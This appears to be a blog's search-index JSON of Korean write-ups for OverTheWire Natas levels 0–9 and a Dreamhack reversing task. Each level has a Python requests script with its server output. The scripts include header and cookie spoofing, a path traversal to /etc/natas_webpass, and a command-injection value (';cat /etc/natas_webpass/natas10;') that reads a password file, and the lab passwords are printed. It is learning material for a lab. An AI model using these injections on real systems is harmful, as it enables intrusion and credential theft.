5Ppq4WEW09L0Nf/K3JUU/wpRwHlH118D44= 혹시나해서 base64로 디코딩 해보았지만 이상한값만 나온다.음… 일단 정보하나를 얻었다. 혹시나해서 query 값을 안넣어 보았다. 그럼 컴퓨터 관련 농담이 나온다. 이상한 값을 넣어 보았다. Incorrect amount of PKCS#7 padding for blocksize PKCS#7? 이게 뭐지? 일단 공부가 필요할 것 같다. 좀더 공부후에 풀이법을 정리 해야겠다. level29의 패스워드를 찾았다! JWwR438wkgTsNKBbcJoowyysdM82YjeF","link":"/2022/02/15/Natas/natas28/"},{"title":"natas level0 python 코드","text":"실행 코드 1import requests username = 'natas0' password = username url = 'http://%s.natas.labs.overthewire.org' % username response = requests.get(url, auth=(username, password)) content = response.text print(content) 결과 코드 1&lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas0&quot;, &quot;pass&quot;: &quot;natas0&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas0&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; You can find the password for the next level on this page. &lt;!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto --&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; gtVrDuiDfck831PqWsLEZy5gyDz1clto","link":"/2022/02/17/python/natas/natas_python_0/"},{"title":"natas level1 python 코드","text":"실행 코드 1import requests username = 'natas1' password = 'gtVrDuiDfck831PqWsLEZy5gyDz1clto' url = 'http://%s.natas.labs.overthewire.org' % username response = requests.get(url, auth=(username, password)) content = response.text print(content) 결과 코드 1&lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas1&quot;, &quot;pass&quot;: &quot;gtVrDuiDfck831PqWsLEZy5gyDz1clto&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body oncontextmenu=&quot;javascript:alert('right clicking has been blocked!');return false;&quot;&gt; &lt;h1&gt;natas1&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; You can find the password for the next level on this page, but rightclicking has been blocked! &lt;!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi --&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi","link":"/2022/02/17/python/natas/natas_python_1/"},{"title":"natas level2 python 코드","text":"실행 코드 1import requests username = 'natas2' password = 'ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi' url = 'http://%s.natas.labs.overthewire.org/files/users.txt' % username response = requests.get(url, auth=(username, password)) content = response.text print(content) 결과 코드 1# username:password alice:BYNdCesZqW bob:jw2ueICLvT charlie:G5vCxkVV3m natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 eve:zo4mJWyNj2 mallory:9urtcpzBmH sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14","link":"/2022/02/17/python/natas/natas_python_2/"},{"title":"natas level3 python 코드","text":"실행 코드 1import requests username = 'natas3' password = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14' url = 'http://%s.natas.labs.overthewire.org/robots.txt' % username response = requests.get(url, auth=(username, password)) content = response.text print(content) 결과 코드 1User-agent: * Disallow: /s3cr3t/ 실행 코드 2import requests username = 'natas3' password = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14' url = 'http://%s.natas.labs.overthewire.org/s3cr3t' % username response = requests.get(url, auth=(username, password)) content = response.text print(content) 결과 코드 2&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Index of /s3cr3t&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Index of /s3cr3t&lt;/h1&gt; &lt;table&gt; &lt;tr&gt; &lt;th valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/blank.gif&quot; alt=&quot;[ICO]&quot;&gt;&lt;/th&gt; &lt;th&gt;&lt;a href=&quot;?C=N;O=D&quot;&gt;Name&lt;/a&gt;&lt;/th&gt; &lt;th&gt;&lt;a href=&quot;?C=M;O=A&quot;&gt;Last modified&lt;/a&gt;&lt;/th&gt; &lt;th&gt;&lt;a href=&quot;?C=S;O=A&quot;&gt;Size&lt;/a&gt;&lt;/th&gt; &lt;th&gt;&lt;a href=&quot;?C=D;O=A&quot;&gt;Description&lt;/a&gt;&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th colspan=&quot;5&quot;&gt; &lt;hr&gt; &lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/back.gif&quot; alt=&quot;[PARENTDIR]&quot;&gt;&lt;/td&gt; &lt;td&gt;&lt;a href=&quot;/&quot;&gt;Parent Directory&lt;/a&gt;&lt;/td&gt; &lt;td&gt;&amp;nbsp;&lt;/td&gt; &lt;td align=&quot;right&quot;&gt; - &lt;/td&gt; &lt;td&gt;&amp;nbsp;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/text.gif&quot; alt=&quot;[TXT]&quot;&gt;&lt;/td&gt; &lt;td&gt;&lt;a href=&quot;users.txt&quot;&gt;users.txt&lt;/a&gt;&lt;/td&gt; &lt;td align=&quot;right&quot;&gt;2016-12-20 05:15 &lt;/td&gt; &lt;td align=&quot;right&quot;&gt; 40 &lt;/td&gt; &lt;td&gt;&amp;nbsp;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th colspan=&quot;5&quot;&gt; &lt;hr&gt; &lt;/th&gt; &lt;/tr&gt; &lt;/table&gt; &lt;address&gt;Apache/2.4.10 (Debian) Server at natas3.natas.labs.overthewire.org Port 80&lt;/address&gt; &lt;/body&gt; &lt;/html&gt; 실행 코드 3import requests username = 'natas3' password = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14' url = 'http://%s.natas.labs.overthewire.org/s3cr3t/users.txt' % username response = requests.get(url, auth=(username, password)) content = response.text print(content) 결과 코드 3natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ","link":"/2022/02/17/python/natas/natas_python_3/"},{"title":"natas level4 python 코드","text":"실행 코드 1import requests username = 'natas4' password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ' url = 'http://%s.natas.labs.overthewire.org' % username headers = {'referer': 'http://natas5.natas.labs.overthewire.org/'} response = requests.get(url, auth=(username, password), headers=headers) content = response.text print(content) 결과 코드 1&lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas4&quot;, &quot;pass&quot;: &quot;Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas4&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq &lt;br/&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index.php&quot;&gt;Refresh page&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq","link":"/2022/02/17/python/natas/natas_python_4/"},{"title":"natas level5 python 코드","text":"실행 코드 1import requests username = 'natas5' password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq' url = 'http://%s.natas.labs.overthewire.org' % username response = requests.get(url, auth=(username, password)) content = response.text print(content) 결과 코드 1&lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas5&quot;, &quot;pass&quot;: &quot;iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas5&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; Access disallowed. You are not logged in&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 실행 코드 2import requests username = 'natas5' password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq' url = 'http://%s.natas.labs.overthewire.org' % username cookies = {'loggedin': '1'} response = requests.get(url, auth=(username, password), cookies=cookies) content = response.text print(content) 결과 코드 2&lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas5&quot;, &quot;pass&quot;: &quot;iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas5&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1","link":"/2022/03/11/python/natas/natas_python_5/"},{"title":"natas level6 python 코드","text":"실행 코드 1import requests username = 'natas6' password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1' url = 'http://%s.natas.labs.overthewire.org/includes/secret.inc' % username response = requests.get(url, auth=(username, password)) content = response.text print(content) 결과 코드 1&lt;? $secret = &quot;FOEIUWGHFEEUHOFUOIU&quot;; ?&gt; 실행 코드 2import requests username = 'natas6' password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1' url = 'http://%s.natas.labs.overthewire.org' % username data={'secret' : 'FOEIUWGHFEEUHOFUOIU', 'submit' : 'submit'} response = requests.post(url, data=data, auth=(username, password)) content = response.text print(content) 결과 코드 2&lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas6&quot;, &quot;pass&quot;: &quot;aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas6&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 &lt;form method=post&gt; Input secret: &lt;input name=secret&gt;&lt;br&gt; &lt;input type=submit name=submit&gt; &lt;/form&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9","link":"/2022/03/11/python/natas/natas_python_6/"},{"title":"natas level7 python 코드","text":"실행 코드 1import requests username = 'natas7' password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9' url = 'http://%s.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8' % username response = requests.get(url, auth=(username, password)) content = response.text print(content) 실행 코드 1&lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas7&quot;, &quot;pass&quot;: &quot;7z3hEENjQtflzgnT29q7wAvMNfZdh0i9&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas7&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; &lt;a href=&quot;index.php?page=home&quot;&gt;Home&lt;/a&gt; &lt;a href=&quot;index.php?page=about&quot;&gt;About&lt;/a&gt; &lt;br&gt; &lt;br&gt; DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe &lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe","link":"/2022/03/11/python/natas/natas_python_7/"},{"title":"natas level8 python 코드","text":"참고 사이트 : https://webisfree.com/2020-11-07/python-base64-%EC%9D%B8%EC%BD%94%EB%94%A9-%EB%94%94%EC%BD%94%EB%94%A9-%EB%B3%80%ED%99%98-%EB%B0%A9%EB%B2%95 실행 코드 1import base64 import requests import binascii username = 'natas8' password = 'DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe' encodedSecret = '3d3d516343746d4d6d6c315669563362' rev_secret ='' url = 'http://%s.natas.labs.overthewire.org' % username #binascii.unhexlify : bin -&gt; hex hex2bin = binascii.unhexlify(encodedSecret).decode() #decode : 바이트 객체는 b''가 붙는다. 이를 없애주는 역활 for x in hex2bin: rev_secret = x + rev_secret scrt = base64.b64decode(rev_secret).decode('utf-8') # response = requests.post(url, auth=(username, password), data={'secret' : scrt, 'submit' : 'submit'}) content = response.text print(content) 실행 코드 1&lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas8&quot;, &quot;pass&quot;: &quot;DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas8&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl &lt;form method=post&gt; Input secret: &lt;input name=secret&gt;&lt;br&gt; &lt;input type=submit name=submit&gt; &lt;/form&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl","link":"/2022/03/11/python/natas/natas_python_8/"},{"title":"natas level9 python 코드","text":"실행 코드 1import requests username = 'natas9' password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl' url = 'http://%s.natas.labs.overthewire.org' % username cmd = ';find / -user natas10;' response = requests.post(url, auth=(username, password), data={'needle' : cmd, 'submit' : 'submit'}) content = response.text print(content) 실행 코드 1&lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas9&quot;, &quot;pass&quot;: &quot;W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas9&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; &lt;form&gt; Find words containing: &lt;input name=needle&gt;&lt;input type=submit name=submit value=Search&gt;&lt;br&gt;&lt;br&gt; &lt;/form&gt; Output: &lt;pre&gt; /var/www/natas/natas10 /etc/natas_webpass/natas10 &lt;/pre&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 실행 코드 2import requests username = 'natas9' password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl' url = 'http://%s.natas.labs.overthewire.org' % username cmd = ';find / -user natas10;' cmd1 = ';cat /etc/natas_webpass/natas10;' response = requests.post(url, auth=(username, password), data={'needle' : cmd1, 'submit' : 'submit'}) content = response.text print(content) 결과 코드 2&lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas9&quot;, &quot;pass&quot;: &quot;W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas9&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; &lt;form&gt; Find words containing: &lt;input name=needle&gt;&lt;input type=submit name=submit value=Search&gt;&lt;br&gt;&lt;br&gt; &lt;/form&gt; Output: &lt;pre&gt; nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu &lt;/pre&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu","link":"/2022/03/23/python/natas/natas_python_9/"},{"title":"rev-basic-1 wirteup","text":"입력받는 부분에 브레이크 포인트를 걸고 디버깅을 해보았다. 일단 아무 값이나 입력해보았다. if문에서 f7로 함수 내부로 진입해보았다. 보니까 cmp로 계속 문자를 비교를 하고 있다.아마 문자들을 다 조합하면 우리가 원하는 flag값을 얻을 수 있을 것 같다. Compar3_the_ch4ract3r 문자를 조합해보니 뭔가 느낌이 좋다.다시 디버깅하여 값을 넣어 본다. Compar3_the_ch4ract3r","link":"/2022/03/24/dreamhack/reversing/rev-basic-1/"},{"title":"포렌식","text":"","link":"/2022/08/17/forensic/GTFObins/"}],"tags":[{"name":"bandit","slug":"bandit","link":"/tags/bandit/"},{"name":"natas","slug":"natas","link":"/tags/natas/"},{"name":"XOR","slug":"XOR","link":"/tags/XOR/"},{"name":"robots.txt","slug":"robots-txt","link":"/tags/robots-txt/"},{"name":"burp suite","slug":"burp-suite","link":"/tags/burp-suite/"},{"name":"cookie","slug":"cookie","link":"/tags/cookie/"},{"name":".inc","slug":"inc","link":"/tags/inc/"},{"name":"암호","slug":"암호","link":"/tags/%EC%95%94%ED%98%B8/"},{"name":"command injection","slug":"command-injection","link":"/tags/command-injection/"},{"name":"file upload","slug":"file-upload","link":"/tags/file-upload/"},{"name":"HxD","slug":"HxD","link":"/tags/HxD/"},{"name":"파일 시그니처","slug":"파일-시그니처","link":"/tags/%ED%8C%8C%EC%9D%BC-%EC%8B%9C%EA%B7%B8%EB%8B%88%EC%B2%98/"},{"name":"sql injection","slug":"sql-injection","link":"/tags/sql-injection/"},{"name":"blind sql injection","slug":"blind-sql-injection","link":"/tags/blind-sql-injection/"},{"name":"web socket","slug":"web-socket","link":"/tags/web-socket/"},{"name":"brute force","slug":"brute-force","link":"/tags/brute-force/"},{"name":"time based blind injection","slug":"time-based-blind-injection","link":"/tags/time-based-blind-injection/"},{"name":"strcmp 취약점","slug":"strcmp-취약점","link":"/tags/strcmp-%EC%B7%A8%EC%95%BD%EC%A0%90/"},{"name":"directory traversal","slug":"directory-traversal","link":"/tags/directory-traversal/"},{"name":"PHP Object Injection","slug":"PHP-Object-Injection","link":"/tags/PHP-Object-Injection/"},{"name":"resource","slug":"resource","link":"/tags/resource/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"VARCHAR 취약점","slug":"VARCHAR-취약점","link":"/tags/VARCHAR-%EC%B7%A8%EC%95%BD%EC%A0%90/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"requset","slug":"requset","link":"/tags/requset/"},{"name":"base64","slug":"base64","link":"/tags/base64/"},{"name":"dreamhack","slug":"dreamhack","link":"/tags/dreamhack/"},{"name":"reversing","slug":"reversing","link":"/tags/reversing/"},{"name":"forensic","slug":"forensic","link":"/tags/forensic/"}],"categories":[{"name":"웹해킹","slug":"웹해킹","link":"/categories/%EC%9B%B9%ED%95%B4%ED%82%B9/"},{"name":"natas","slug":"웹해킹/natas","link":"/categories/%EC%9B%B9%ED%95%B4%ED%82%B9/natas/"},{"name":"hacking Reference site","slug":"hacking-Reference-site","link":"/categories/hacking-Reference-site/"},{"name":"bandit","slug":"bandit","link":"/categories/bandit/"},{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"natas","slug":"natas","link":"/categories/natas/"},{"name":"python","slug":"natas/python","link":"/categories/natas/python/"},{"name":"dreamhack","slug":"dreamhack","link":"/categories/dreamhack/"},{"name":"reversing","slug":"dreamhack/reversing","link":"/categories/dreamhack/reversing/"},{"name":"forensic","slug":"forensic","link":"/categories/forensic/"}]}